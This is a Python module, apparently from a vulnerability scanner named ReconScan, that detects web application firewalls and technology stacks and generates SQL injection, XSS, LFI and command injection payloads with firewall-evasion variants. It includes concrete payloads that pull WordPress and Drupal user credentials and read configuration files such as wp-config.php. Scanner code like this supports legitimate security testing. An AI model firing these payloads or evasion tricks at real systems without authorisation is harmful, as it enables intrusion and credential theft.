"""
Enhanced Payload Manager for ReconScan

Advanced payload generation system with context awareness, WAF evasion,
and intelligent payload selection for improved vulnerability detection accuracy.
"""

import re
import random
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum

# Import existing payload libraries
from .payloads.sql_injection_payloads import SQLInjectionPayloads
from .payloads.xss_payloads import XSSPayloads
from .payloads.lfi_payloads import LFIPayloads
from .payloads.command_injection_payloads import CommandInjectionPayloads
from .payloads.directory_traversal_payloads import DirectoryTraversalPayloads

class VulnerabilityType(Enum):
    """Enumeration of supported vulnerability types."""
    SQL_INJECTION = "sqli"
    XSS = "xss"
    LFI = "lfi"
    COMMAND_INJECTION = "cmd"
    DIRECTORY_TRAVERSAL = "dt"

class WAFType(Enum):
    """Enumeration of detected WAF types."""
    CLOUDFLARE = "cloudflare"
    AKAMAI = "akamai"
    INCAPSULA = "incapsula"
    AWS_WAF = "aws_waf"
    F5_BIG_IP = "f5_big_ip"
    GENERIC = "generic"
    NONE = "none"

@dataclass
class PayloadContext:
    """Context information for intelligent payload generation."""
    parameter_name: str = ""
    parameter_type: str = "string"  # string, numeric, array, json
    injection_point: str = ""
    response_content: str = ""
    detected_technology: Dict[str, str] = None
    waf_type: WAFType = WAFType.NONE
    previous_payloads: List[str] = None
    success_indicators: List[str] = None
    
    def __post_init__(self):
        if self.detected_technology is None:
            self.detected_technology = {}
        if self.previous_payloads is None:
            self.previous_payloads = []
        if self.success_indicators is None:
            self.success_indicators = []

class EnhancedPayloadManager:
    """
    Advanced payload manager with context-aware generation and WAF evasion.
    
    Features:
    - Context-aware payload selection based on injection point analysis
    - WAF detection and targeted evasion techniques
    - Technology stack fingerprinting for optimized payloads
    - Machine learning-inspired payload mutation
    - Real-time success rate tracking and adaptation
    """
    
    def __init__(self):
        """Initialize the enhanced payload manager with all vulnerability types."""
        # Initialize payload libraries
        self.sql_payloads = SQLInjectionPayloads()
        self.xss_payloads = XSSPayloads()
        self.lfi_payloads = LFIPayloads()
        self.cmd_payloads = CommandInjectionPayloads()
        self.dt_payloads = DirectoryTraversalPayloads()
        
        # WAF detection patterns
        self.waf_signatures = {
            WAFType.CLOUDFLARE: [
                r'cloudflare', r'cf-ray', r'__cfduid', r'attention required',
                r'cloudflare.com/5xx-error-page'
            ],
            WAFType.AKAMAI: [
                r'akamai', r'reference #\d+', r'access denied',
                r'ghost.akamai.com'
            ],
            WAFType.INCAPSULA: [
                r'incapsula', r'incap_ses', r'visid_incap',
                r'request unsuccessful'
            ],
            WAFType.AWS_WAF: [
                r'aws', r'x-amzn-requestid', r'x-amzn-errortype',
                r'amazon web services'
            ],
            WAFType.F5_BIG_IP: [
                r'f5', r'bigip', r'x-wa-info', r'tmm info'
            ]
        }
        
        # Technology detection patterns
        self.tech_patterns = {
            'framework': {
                'wordpress': [r'wp-content', r'wp-includes', r'/wp-admin/'],
                'drupal': [r'drupal', r'sites/default', r'/node/\d+'],
                'joomla': [r'joomla', r'/administrator/', r'option=com_'],
                'magento': [r'magento', r'/skin/frontend/', r'Mage.Cookies'],
                'laravel': [r'laravel_session', r'laravel', r'_token'],
                'django': [r'django', r'csrfmiddlewaretoken'],
                'asp.net': [r'__viewstate', r'aspxerrorpath', r'aspnet_sessionid'],
                'php': [r'phpsessid', r'\.php', r'php/\d+'],
                'jsp': [r'jsessionid', r'\.jsp', r'\.do']
            },
            'database': {
                'mysql': [r'mysql', r'you have an error in your sql syntax'],
                'postgresql': [r'postgresql', r'pg_', r'relation.*does not exist'],
                'mssql': [r'microsoft.*sql', r'sqlserver', r'invalid column name'],
                'oracle': [r'oracle', r'ora-\d+', r'plsql'],
                'sqlite': [r'sqlite', r'database is locked', r'no such table']
            },
            'server': {
                'apache': [r'apache', r'server: apache'],
                'nginx': [r'nginx', r'server: nginx'],
                'iis': [r'iis', r'server: microsoft-iis'],
                'tomcat': [r'tomcat', r'apache.*tomcat']
            }
        }
        
        # Success rate tracking for adaptive payload selection
        self.payload_success_rates = {}
        
        # TODO: Implement machine learning model for payload effectiveness prediction
        self.ml_model = None
        
    def generate_adaptive_payloads(self, vuln_type: VulnerabilityType, context: PayloadContext, 
                                 max_payloads: int = 15) -> List[str]:
        """
        Generate adaptive payloads based on context analysis and historical success rates.
        
        Args:
            vuln_type: Type of vulnerability to test for
            context: Contextual information for payload generation
            max_payloads: Maximum number of payloads to generate
            
        Returns:
            List of optimized payloads for the given context
        """
        # Step 1: Detect WAF if not already known
        if context.waf_type == WAFType.NONE and context.response_content:
            context.waf_type = self._detect_waf(context.response_content)
        
        # Step 2: Analyze technology stack
        if not context.detected_technology and context.response_content:
            context.detected_technology = self._detect_technology(context.response_content)
        
        # Step 3: Generate base payloads using context-aware selection
        base_payloads = self._generate_context_aware_payloads(vuln_type, context)
        
        # Step 4: Apply WAF evasion techniques
        evasive_payloads = []
        for payload in base_payloads:
            evasive_variants = self._generate_waf_evasion_variants(payload, vuln_type, context.waf_type)
            evasive_payloads.extend(evasive_variants)
        
        # Step 5: Apply payload mutation and optimization
        mutated_payloads = self._mutate_payloads(evasive_payloads, context)
        
        # Step 6: Score and rank payloads based on success probability
        scored_payloads = self._score_payloads(mutated_payloads, vuln_type, context)
        
        # Step 7: Return top-ranked payloads
        return [payload for payload, score in scored_payloads[:max_payloads]]
    
    def _detect_waf(self, response_content: str) -> WAFType:
        """Detect Web Application Firewall from response content."""
        response_lower = response_content.lower()
        
        for waf_type, patterns in self.waf_signatures.items():
            for pattern in patterns:
                if re.search(pattern, response_lower, re.IGNORECASE):
                    return waf_type
        
        return WAFType.GENERIC if any(
            keyword in response_lower 
            for keyword in ['blocked', 'forbidden', 'security', 'firewall', 'protection']
        ) else WAFType.NONE
    
    def _detect_technology(self, response_content: str) -> Dict[str, str]:
        """Detect technology stack from response content."""
        detected = {}
        response_lower = response_content.lower()
        
        for tech_category, tech_types in self.tech_patterns.items():
            for tech_name, patterns in tech_types.items():
                for pattern in patterns:
                    if re.search(pattern, response_lower, re.IGNORECASE):
                        detected[tech_category] = tech_name
                        break
                if tech_category in detected:
                    break
        
        return detected
    
    def _generate_context_aware_payloads(self, vuln_type: VulnerabilityType, 
                                       context: PayloadContext) -> List[str]:
        """Generate payloads based on vulnerability type and context."""
        if vuln_type == VulnerabilityType.SQL_INJECTION:
            return self.sql_payloads.generate_context_aware_payloads(
                context.parameter_type, 
                context.parameter_name, 
                context.detected_technology
            )
        
        elif vuln_type == VulnerabilityType.XSS:
            return self.xss_payloads.generate_context_aware_payloads(
                context.injection_point,
                context.response_content,
                context.parameter_name
            )
        
        elif vuln_type == VulnerabilityType.LFI:
            return self.lfi_payloads.get_targeted_payloads('medium')
        
        elif vuln_type == VulnerabilityType.COMMAND_INJECTION:
            return self.cmd_payloads.get_targeted_payloads('medium')
        
        elif vuln_type == VulnerabilityType.DIRECTORY_TRAVERSAL:
            return self.dt_payloads.get_targeted_payloads('medium')
        
        return []
    
    def _generate_waf_evasion_variants(self, payload: str, vuln_type: VulnerabilityType, 
                                     waf_type: WAFType) -> List[str]:
        """Generate WAF evasion variants for a given payload."""
        if vuln_type == VulnerabilityType.SQL_INJECTION:
            return self.sql_payloads.generate_waf_evasion_payloads(payload, waf_type.value)
        
        elif vuln_type == VulnerabilityType.XSS:
            return self.xss_payloads.generate_waf_evasion_payloads(payload, waf_type.value)
        
        # For other vulnerability types, apply generic evasion techniques
        return self._apply_generic_evasion(payload, waf_type)
    
    def _apply_generic_evasion(self, payload: str, waf_type: WAFType) -> List[str]:
        """Apply generic evasion techniques for vulnerability types without specific methods."""
        evasions = [payload]  # Start with original
        
        # URL encoding variations
        import urllib.parse
        evasions.append(urllib.parse.quote(payload, safe=''))
        evasions.append(urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe=''))
        
        # Case variations
        evasions.append(payload.swapcase())
        evasions.append(payload.upper())
        evasions.append(payload.lower())
        
        # Whitespace manipulation
        evasions.append(payload.replace(' ', '\t'))
        evasions.append(payload.replace(' ', '\n'))
        evasions.append(payload.replace(' ', '%20'))
        
        # WAF-specific evasions
        if waf_type == WAFType.CLOUDFLARE:
            evasions.append(payload.replace('..', '..;'))
            evasions.append(payload.replace('/', '\\'))
        
        elif waf_type == WAFType.AKAMAI:
            evasions.append(payload.replace('=', '%3D'))
            evasions.append(payload.replace('&', '%26'))
        
        return list(set(evasions))  # Remove duplicates
    
    def _mutate_payloads(self, payloads: List[str], context: PayloadContext) -> List[str]:
        """Apply intelligent mutations to payloads based on context."""
        mutated = list(payloads)  # Start with originals
        
        for payload in payloads[:5]:  # Limit mutation to top 5 for performance
            # Parameter name injection
            if context.parameter_name:
                param_injection = payload.replace('test', context.parameter_name)
                if param_injection != payload:
                    mutated.append(param_injection)
            
            # Technology-specific mutations
            if 'framework' in context.detected_technology:
                framework = context.detected_technology['framework']
                
                if framework == 'wordpress':
                    mutated.append(payload.replace('/etc/', '/wp-config.php'))
                elif framework == 'drupal':
                    mutated.append(payload.replace('/etc/', '/sites/default/settings.php'))
                elif framework == 'php':
                    mutated.append(payload.replace('cat', 'php -r'))
            
            # Randomization for bypass
            if random.random() < 0.3:  # 30% chance to add randomization
                random_suffix = ''.join(random.choices('abcdef0123456789', k=4))
                mutated.append(payload + '/*' + random_suffix + '*/')
        
        return mutated
    
    def _score_payloads(self, payloads: List[str], vuln_type: VulnerabilityType, 
                       context: PayloadContext) -> List[Tuple[str, float]]:
        """Score payloads based on success probability and context fitness."""
        scored = []
        
        for payload in payloads:
            score = 0.5  # Base score
            
            # Historical success rate bonus
            payload_key = f"{vuln_type.value}:{payload[:20]}"  # Use first 20 chars as key
            if payload_key in self.payload_success_rates:
                score += self.payload_success_rates[payload_key] * 0.3
            
            # Context fitness scoring
            if context.parameter_name:
                # Parameter name relevance
                if context.parameter_name.lower() in payload.lower():
                    score += 0.1
                
                # Parameter type fitness
                if context.parameter_type == 'numeric' and any(c.isdigit() for c in payload):
                    score += 0.1
                elif context.parameter_type == 'string' and any(c.isalpha() for c in payload):
                    score += 0.1
            
            # Technology stack bonus
            if context.detected_technology:
                if 'database' in context.detected_technology:
                    db_type = context.detected_technology['database']
                    if vuln_type == VulnerabilityType.SQL_INJECTION:
                        if db_type.lower() in payload.lower():
                            score += 0.2
                
                if 'framework' in context.detected_technology:
                    framework = context.detected_technology['framework']
                    if framework.lower() in payload.lower():
                        score += 0.15
            
            # Complexity penalty (simpler payloads often work better)
            complexity = len(payload) / 100.0
            score -= min(complexity * 0.1, 0.2)
            
            # Evasion technique bonus
            if any(technique in payload for technique in ['/**/', '/*', '%20', '%27', '\\x']):
                score += 0.1
            
            scored.append((payload, max(0.0, min(1.0, score))))  # Clamp between 0 and 1
        
        # Sort by score descending
        return sorted(scored, key=lambda x: x[1], reverse=True)
    
    def update_payload_success(self, vuln_type: VulnerabilityType, payload: str, success: bool):
        """Update success rate tracking for adaptive learning."""
        payload_key = f"{vuln_type.value}:{payload[:20]}"
        
        if payload_key not in self.payload_success_rates:
            self.payload_success_rates[payload_key] = 0.5  # Start with neutral
        
        # Simple learning rate adjustment
        current_rate = self.payload_success_rates[payload_key]
        learning_rate = 0.1
        
        if success:
            self.payload_success_rates[payload_key] = min(1.0, current_rate + learning_rate)
        else:
            self.payload_success_rates[payload_key] = max(0.0, current_rate - learning_rate)
    
    def get_technology_specific_payloads(self, vuln_type: VulnerabilityType, 
                                       technology: str) -> List[str]:
        """Get payloads specifically crafted for detected technologies."""
        if vuln_type == VulnerabilityType.SQL_INJECTION:
            if technology.lower() == 'wordpress':
                return [
                    "' UNION SELECT user_login,user_pass FROM wp_users--",
                    "' AND (SELECT COUNT(*) FROM wp_users)>0--",
                    "1' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--"
                ]
            elif technology.lower() == 'drupal':
                return [
                    "' UNION SELECT name,pass FROM users--",
                    "' AND (SELECT COUNT(*) FROM users)>0--"
                ]
        
        elif vuln_type == VulnerabilityType.LFI:
            if technology.lower() == 'wordpress':
                return [
                    "../wp-config.php",
                    "../../../wp-config.php",
                    "wp-config.php%00"
                ]
            elif technology.lower() == 'drupal':
                return [
                    "../sites/default/settings.php",
                    "../../../sites/default/settings.php"
                ]
        
        return []
    
    def analyze_response_patterns(self, responses: List[Tuple[str, str]]) -> Dict[str, any]:
        """
        Analyze response patterns to improve future payload generation.
        
        Args:
            responses: List of (payload, response_content) tuples
            
        Returns:
            Dictionary with analysis results for optimization
        """
        analysis = {
            'common_errors': [],
            'blocked_patterns': [],
            'success_indicators': [],
            'waf_behaviors': [],
            'response_variations': []
        }
        
        # Analyze error patterns
        error_patterns = [
            r'syntax error',
            r'sql.*error',
            r'mysql.*error',
            r'postgresql.*error',
            r'oracle.*error',
            r'warning.*mysql',
            r'fatal error'
        ]
        
        for payload, response in responses:
            response_lower = response.lower()
            
            # Check for error indicators
            for pattern in error_patterns:
                if re.search(pattern, response_lower):
                    analysis['common_errors'].append(pattern)
            
            # Check for blocking indicators
            block_indicators = ['blocked', 'forbidden', 'access denied', 'security violation']
            for indicator in block_indicators:
                if indicator in response_lower:
                    analysis['blocked_patterns'].append(payload[:30])  # First 30 chars
            
            # Check for potential success indicators
            success_indicators = ['root:', 'admin', 'password', 'users', 'database']
            for indicator in success_indicators:
                if indicator in response_lower:
                    analysis['success_indicators'].append(indicator)
        
        return analysis

# TODO: Implement machine learning integration for payload effectiveness prediction
# TODO: Add real-time WAF rule learning and adaptation
# TODO: Implement payload success correlation analysis
# TODO: Add support for custom payload templates and rules 